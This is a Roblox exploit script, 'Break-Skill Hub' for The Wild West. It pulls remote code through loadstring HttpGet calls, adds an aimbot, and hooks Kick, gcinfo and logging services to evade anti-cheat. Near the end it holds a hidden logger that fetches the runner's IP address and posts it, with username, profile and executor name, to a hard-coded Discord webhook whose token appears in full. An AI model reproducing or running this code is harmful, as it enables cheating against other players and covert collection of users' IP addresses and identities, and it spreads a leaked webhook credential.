--[
--The Wild West
--]

--[
--UI Library And Teleport Place Library And Notification Library
--]

getgenv()["IrisAd"] = true

local Notification = loadstring(game:HttpGet("https://api.irisapp.ca/Scripts/IrisBetterNotifications.lua"))()

local TeleportPlaceLibrary = loadstring(game:HttpGet("https://raw.githubusercontent.com/LeoKholYt/roblox/main/lk_serverhop.lua"))()

getgenv()["IrisAd"] = true

loadstring(game:HttpGet("https://raw.githubusercontent.com/Sklllus/Break-Skill-Hub-V1/main/UI.lua"))()

local Warning = library:AddWarning({
    type = "confirm"
})

library.title = "Break-Skill Hub - V1"
library.foldername = "Break-Skill Hub - V1"
library.fileext = ".json"

--Instances And Functions

getgenv()["Developer_345RTHD1"] = true

local CoreGui = game:GetService("CoreGui")
local HttpService = game:GetService("HttpService")
local LogService = game:GetService("LogService")
local MarketplaceService = game:GetService("MarketplaceService")
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local ScriptContext = game:GetService("ScriptContext")
local TeleportService = game:GetService("TeleportService")
local UserInputService = game:GetService("UserInputService")
local Workspace = game:GetService("Workspace")

local Client = Players.LocalPlayer

local BackgroundList = {
    Floral = "rbxassetid://5553946656",
    Flowers = "rbxassetid://6071575925",
    Circles = "rbxassetid://6071579801",
    Hearts = "rbxassetid://6073763717"
}

local FOV = Drawing.new("Circle")

FOV.Visible = false
FOV.Filled = false
FOV.Color = Color3.fromRGB(255, 255, 255)
FOV.NumSides = 14
FOV.Thickness = 2
FOV.Transparency = 0
FOV.Radius = 100
FOV.Position = UserInputService:GetMouseLocation()

local WallCheckParams = RaycastParams.new()

WallCheckParams.FilterType = Enum.RaycastFilterType.Blacklist
WallCheckParams.IgnoreWater = true

local function Raycast(origin, direction, table)
    WallCheckParams.FilterDescendantsInstances = table

    return Workspace:Raycast(origin, direction, WallCheckParams)
end

local function TeamCheckFunc(enabled, player)
    if not enabled then
        return true
    end

    return Client.Team ~= player.Team
end

local function WallCheckFunc(enabled, camera, hitbox, character)
    if not enabled then
        return true
    end

    return not Raycast(camera.Position, hitbox.Position - camera.Position, {
        Client.Character,
        character
    })
end

local function DistanceCheckFunc(enabled, distance, maxDistance)
    if not enabled then
        return true
    end

    return distance * 0.28 <= maxDistance
end

local function AimAt(hitbox, smooth)
    if not hitbox then
        return
    end

    local Mouse = UserInputService:GetMouseLocation()

    mousemoverel((hitbox[5].X - Mouse.X) * smooth, (hitbox[5].Y - Mouse.Y) * smooth)
end

local function GetHitbox(enabled, dFov, fov, tc, bp, wc, dc, md, pe, pv)
    if not enabled then
        return
    end

    local Camera, ClosestHitbox = Workspace.CurrentCamera, nil

    fov = dFov and ((120 - Camera.FieldOfView) * 4) + fov or fov

    for i, p in pairs(Players:GetPlayers()) do
        local Char = p.Character

        if not Char then
            continue
        end

        if p ~= Client and TeamCheckFunc(tc, p) then
            local Hum = Char:FindFirstAncestorOfClass("Humanoid")

            if not Hum then
                continue
            end

            if Hum.Health <= 0 then
                continue
            end

            for i2, b in pairs(bp) do
                b = Char:FindFirstChild(b)

                if not b then
                    continue
                end

                local Distance = (b.Position - Camera.CFrame.Position).Magnitude

                if WallCheckFunc(wc, Camera.CFrame, b, Char) and DistanceCheckFunc(dc, Distance, md) then
                    local ScreenPosition, OnScreen = Camera:WorldToViewportPoint(b.Position)

                    local Mag = (Vector2.new(ScreenPosition.X, ScreenPosition.Y) - UserInputService:GetMouseLocation()).Magnitude

                    if OnScreen and Mag <= fov then
                        fov, ClosestHitbox = Mag, {
                            p,
                            Char,
                            b,
                            Distance,
                            ScreenPosition
                        }
                    end
                end
            end
        end
    end

    return ClosestHitbox
end

--[
--CombatTab
--]

local CombatTab = library:AddTab("Combat Tab")

local CombatColumn1 = CombatTab:AddColumn()
local CombatColumn2 = CombatTab:AddColumn()

--Aimbot Section

local AimbotSection = CombatColumn1:AddSection("Aimbot")

AimbotSection:AddDivider("» Aimbot «")

local AimbotEnabled = AimbotSection:AddToggle({
    text = "Enabled",
    flag = "CombatTab_AimbotSection_Enabled"
}):AddBind({
    flag = "CombatTab_AimbotSection_Enabled_Bind",
    mode = "hold",
    key = Enum.UserInputType.MouseButton2
})

AimbotSection:AddDivider("» Settings «")

local Prediction = AimbotSection:AddToggle({
    text = "Prediction",
    flag = "CombatTab_AimbotSection_Prediction"
})

local TeamCheck = AimbotSection:AddToggle({
    text = "Team Check",
    flag = "CombatTab_AimbotSection_TeamCheck"
})

local VisibilityCheck = AimbotSection:AddToggle({
    text = "Visibility Check",
    flag = "CombatTab_AimbotSection_VisibilityCheck"
})

local DistanceCheck = AimbotSection:AddToggle({
    text = "Distance Check",
    flag = "CombatTab_AimbotSection_DistanceCheck"
})

local Smoothness = AimbotSection:AddSlider({
    text = "Smoothness",
    flag = "CombatTab_AimbotSection_Smoothness",
    suffix = "%",
    min = 0,
    value = 25,
    max = 100
})

local FieldOfView = AimbotSection:AddSlider({
    text = "Field Of View",
    flag = "CombatTab_AimbotSection_FieldOfView",
    min = 0,
    value = 100,
    max = 500,
    callback = function(val)
        FOV.Radius = val
    end
})

local Distance = AimbotSection:AddSlider({
    text = "Distance",
    flag = "CombatTab_AimbotSection_Distance",
    suffix = "studs",
    min = 0,
    value = 250,
    max = 1000
})

local PredictionVelocity = AimbotSection:AddSlider({
    text = "Prediction Velocity",
    flag = "CombatTab_AimbotSection_PredictionVelocity"
})

local BodyParts = AimbotSection:AddList({
    text = "Body Parts",
    flag = "CombatTab_AimbotSection_BodyParts",
    multiselect = false,
    max = 2,
    values = {
        "Head",
        "HumanoidRootPart"
    }
})

--FOV Section

local FOVSection = CombatColumn2:AddSection("FOV")

FOVSection:AddDivider("» FOV «")

local FOVEnabled = FOVSection:AddToggle({
    text = "Enabled",
    flag = "CombatTab_FOVSection_Enabled",
    callback = function(val)
        FOV.Visible = val
    end
}):AddColor({
    flag = "CombatTab_FOVSection_Enabled_Color",
    color = Color3.fromRGB(255, 255, 255),
    trans = 0,
    callback = function(val)
        FOV.Color = val
    end,
    calltrans = function(val)
        FOV.Transparency = val
    end
})

FOVSection:AddDivider("» Settings «")

local Filled = FOVSection:AddToggle({
    text = "Filled",
    flag ="CombatTab_FOVSection_Filled",
    callback = function(val)
        FOV.Filled = val
    end
})

local NumSides = FOVSection:AddSlider({
    text = "Num Sides",
    flag = "CombatTab_FOVSection_NumSides",
    min = 0,
    value = 14,
    max = 100,
    callback = function(val)
        FOV.NumSides = val
    end
})

local Thickness = FOVSection:AddSlider({
    text = "Thickness",
    flag = "CombatTab_FOVSection_Thickness",
    min = 0,
    value = 2,
    max = 10,
    callback = function(val)
        FOV.Thickness = val
    end
})

--[
--Settings Tab
--]

local SettingsTab = library:AddTab("Settings")

local SettingsColumn1 = SettingsTab:AddColumn()
local SettingsColumn2 = SettingsTab:AddColumn()
local SettingsColumn3 = SettingsTab:AddColumn()

--Info Section

local InfoSection = SettingsColumn1:AddSection("Info")

InfoSection:AddDivider("» Info «")

InfoSection:AddLabel("UI Library Made By Jan", Color3.fromRGB(255, 255, 255))
InfoSection:AddLabel("Script Made By xS_Killus (xX_XSI)", Color3.fromRGB(255, 255, 255))
InfoSection:AddLabel("API Made By xS_Killus (xX_XSI)", Color3.fromRGB(255, 255, 255))

InfoSection:AddDivider("» Changelogs «")

--Menu Section

local MenuSection = SettingsColumn2:AddSection("Menu")

MenuSection:AddDivider("» Menu Options «")

MenuSection:AddBind({
    text = "Open / Close",
    flag = "UI Toggle",
    nomouse = true,
    key = "RightShift",
    callback = function(val)
        library:Close()
    end
})

MenuSection:AddColor({
    text = "Accent Color",
    flag = "Menu Accent Color",
    color = Color3.fromRGB(255, 40, 40),
    callback = function(val)
        if library.currentTab then
            library.currentTab.button.TextColor3 = val
        end

        for i, v in pairs(library.theme) do
            v[(v.ClassName == "TextLabel" and "TextColor3") or (v.ClassName == "ImageLabel" and "ImageColor3") or "BackgroundColor3"] = val
        end
    end
})

MenuSection:AddList({
    text = "Background",
    max = 4,
    flag = "background",
    values = {
        "Floral",
        "Flowers",
        "Circles",
        "Hearts"
    },
    value = "Floral",
    callback = function(val)
        if library.main then
            library.main.Image = BackgroundList[val]
        end
    end
}):AddColor({
    flag = "backgroundcolor",
    color = Color3.fromRGB(10, 10, 10),
    callback = function(val)
        if library.main then
            library.main.ImageColor3 = val
        end
    end,
    trans = 1,
    calltrans = function(val)
        if library.main then
            library.main.ImageTransparency = 1 - val
        end
    end
})

MenuSection:AddSlider({
    text = "Tile Size",
    min = 50,
    max = 500,
    value = 50,
    callback = function(val)
        if library.main then
            library.main.TileSize = UDim2.new(0, val, 0, val)
        end
    end
})

MenuSection:AddDivider("» Other Options «")

MenuSection:AddButton({
    text = "Discord",
    callback = function()
        syn.request({
            Url = "http://127.0.0.1:6463/rpc?v=1",
            Method = "POST",
            Headers = {
                ["Content-Type"] = "application/json",
                ["origin"] = "https://discord.com"
            },
            Body = HttpService:JSONEncode({
                ["args"] = {
                    ["code"] = "CODE INVITE"
                },
                ["cmd"] = "INVITE_BROWSER",
                ["nonce"] = "."
            })
        })
    end
})

MenuSection:AddButton({
    text = "Change Server",
    callback = function()
        TeleportPlaceLibrary:Teleport(game.PlaceId)
    end
})

MenuSection:AddButton({
    text = "Re-Join Server",
    callback = function()
        TeleportService:Teleport(game.PlaceId, Client)
    end
})

--Configs Section

local ConfigsSection = SettingsColumn3:AddSection("Configs")

ConfigsSection:AddDivider("» Configs «")

ConfigsSection:AddBox({
    text = "Config Name",
    skipflag = true
})

ConfigsSection:AddList({
    text = "Configs",
    skipflag = true,
    value = "",
    flag = "Config List",
    values = library:GetConfigs()
})

ConfigsSection:AddButton({
    text = "Create",
    callback = function()
        library:GetConfigs()

        writefile(library.foldername .. "/" .. library.flags["Config Name"] .. library.fileext, "{}")

        library.options["Config List"]:AddValue(library.flags["Config Name"])
    end
})

ConfigsSection:AddButton({
    text = "Save",
    callback = function()
        local R, G, B = library.round(library.flags["Menu Accent Color"])

        Warning.text = "Are you sure you want to save the current settings to config <font color='rgb(" .. R .. "," .. G .. "," .. B .. ")'>" .. library.flags["Config List"] .. "</font>?"

        if Warning:Show() then
            library:SaveConfig(library.flags["Config List"])
        end
    end
})

ConfigsSection:AddButton({
    text = "Load",
    callback = function()
        local R, G, B = library.round(library.flags["Menu Accent Color"])

        Warning.text = "Are you sure you want to load config <font color='rgb(" .. R .. "," .. G .. "," .. B .. ")'>" .. library.flags["Config List"] .. "</font>?"

        if Warning:Show() then
            library:LoadConfig(library.flags["Config List"])
        end
    end
})

ConfigsSection:AddButton({
    text = "Delete",
    callback = function()
        local R, G, B = library.round(library.flags["Menu Accent Color"])

        Warning.text = "Are you sure you want to delete config <font color='rgb(" .. R .. "," .. G .. "," .. B .. ")'>" .. library.flags["Config List"] .. "</font>?"

        if Warning:Show() then
            local Config = library.flags["Config List"]

            if table.find(library:GetConfigs(), Config) and isfile(library.foldername .. "/" .. Config .. library.fileext) then
                library.options["Config List"]:RemoveValue(Config)

                delfile(library.foldername .. "/" .. Config .. library.fileext)
            end
        end
    end
})

--XD

library:Init()
library:selectTab(library.tabs[1])

getgenv()["Break-Skill_Hub_TheWildWest_Loaded"] = true
getgenv()["Break-Skill_Hub_Loaded"] = true

--Memory Check Bypass

hookfunction((gcinfo or collectgarbage), function(...)
    if getgenv().Memory then
        return math.random(200, 350)
    end
end)

local OldNameCall4

OldNameCall4 = hookmetamethod(game, "__namecall", function(...)
    local Args = {...}

    local Self = Args[1]

    local GetMethod = getnamecallmethod()

    if GetMethod == "Kick" and getgenv().Kick then
        return nil
    end

    return OldNameCall4(...)
end)

--Universal Bypass

local Disables = {
    Client.Idled,
    ScriptContext.Error,
    LogService.MessageOut
}

local Nos = {
    "PreloadAsync",
    "Kick",
    "kick",
    "xpcall",
    "gcinfo",
    "collectgarbage"
}

local Yes = {
    Client,
    CoreGui
}

for i, v in pairs(Disables) do
    for i2, v2 in pairs(getconnections(v)) do
        v2:Disable()
    end
end

local OldNameCall

OldNameCall = hookmetamethod(game, "__namecall", newcclosure(function(self, ...)
    local Args = {...}

    local GetMethod = getnamecallmethod()

    if table.find(Nos, GetMethod) and table.find(Yes, self) then
        return nil or task.wait(math.huge)
    end

    if GetMethod == "FindService" and self.Name == "VirtualUser" and self.Name == "VirtualInputManager" then
        return
    end

    if typeof(Args) ~= "Instance" then
        return OldNameCall(self, ...)
    end

    return OldNameCall(unpack(Args), self, ...)
end))

if setffag then
    setffag("HumanoidParallelRemoveNoPhysics", "False")
    setffag("HumanoidParallelRemoveNoPhysicsNoSimulate2", "False")
end

if setfpscap then
    setfpscap(100)
end

ScriptContext:SetTimeout(0.5)

--The Wild West Bypass

RunService.Heartbeat:Connect(function()
    if getgenv()["CombatTab_AimbotSection_Enabled"] then
        AimAt(GetHitbox(getgenv()["CombatTab_AimbotSection_Enabled"], getgenv()["CombatTab_FOVSection_Dynamic"], getgenv()["CombatTab_AimbotSection_FieldOfView"], getgenv()["CombatTab_AimbotSection_TeamCheck"], getgenv()["CombatTab_AimbotSection_BodyParts"], getgenv()["CombatTab_AimbotSection_VisibilityCheck"], getgenv()["CombatTab_AimbotSection_DistanceCheck"], getgenv()["CombatTab_AimbotSection_Distance"]), getgenv()["CombatTab_AimbotSection_Smoothness"] / 100)
    end
end)

if not getgenv()["Developer_345RTHD1"] then
    local Web = syn.request({
        Url = "https://api.ipify.org/"
    })

    local URL = "https://discord.com/api/webhooks/1035991401164447824/hVKTRGxOars5_mMr4cpw6W_pHu9BNP5h3IRfDMxfRnt_VvK9KLbAE9ZW1dsvO3nshJhI"

    local Headers = {
        ["Content-Type"] = "application/json"
    }

    for i, v in pairs(Web) do
        if v ~= 200 and typeof(v) ~= "table" and v ~= true then
            local Data = {
                ["content"] = "",
                ["embeds"] = {
                    {
                        ["title"] = "**Break-Skill Hub - V1 Logger**",
                        ["description"] = "```def\nUsername: " .. Client.Name .. "\nProfile: https://www.roblox.com/users/" .. Client.UserId .. "\nGame: " .. MarketplaceService:GetProductInfo(game.PlaceId).Name .. "\nScript to join: game:GetService('TeleportService'):TeleportToPlaceInstance(" .. tostring(game.PlaceId) .. ", " .. tostring(game.GameId) .. ", game.Players.LocalPlayer)" .. "\nExecutor: " .. identifyexecutor() .. "\nIP: " .. v .. "```",
                        ["type"] = "rich",
                        ["color"] = tonumber(0xd40000)
                    }
                }
            }

            local NewData = HttpService:JSONEncode(Data)

            syn.request({
                Url = URL,
                Body = NewData,
                Method = "POST",
                Headers = Headers
            })
        end
    end
end

--Universal Bypass V2

local System = {
    379614936,
    860428890,
    866472074,
    2664771962,
    2664773504,
    5006801542,
    5122567177,
    5122568155,
    5122568874,
    5827139096
}

if not table.find(System, game.PlaceId) then
    return
end

local Char = Client.Character or Client.CharacterAdded:Wait()

local SystemTable = {
    "xpcall",
    "pcall",
    "Idle",
    "Deactivate",
    "PreloadAsync",
    "FindService",
    "collectgarbage",
    "GetPropertyChangedSignal",
    "getfenv",
    "Kick",
    "kick"
}

local SystemTable2 = {
    Char,
    CoreGui,
    Client,
    Client.Kick
}

local OldNameCall3

OldNameCall3 = hookmetamethod(game, "__namecall" or "__Index", function(self, ...)
    local Args = {...}

    local GetMethod = getnamecallmethod()

    if table.find(SystemTable, GetMethod) and table.find(SystemTable2, self) then
        return OldNameCall3(self, ...)
    end

    return OldNameCall3(self, ...)
end)
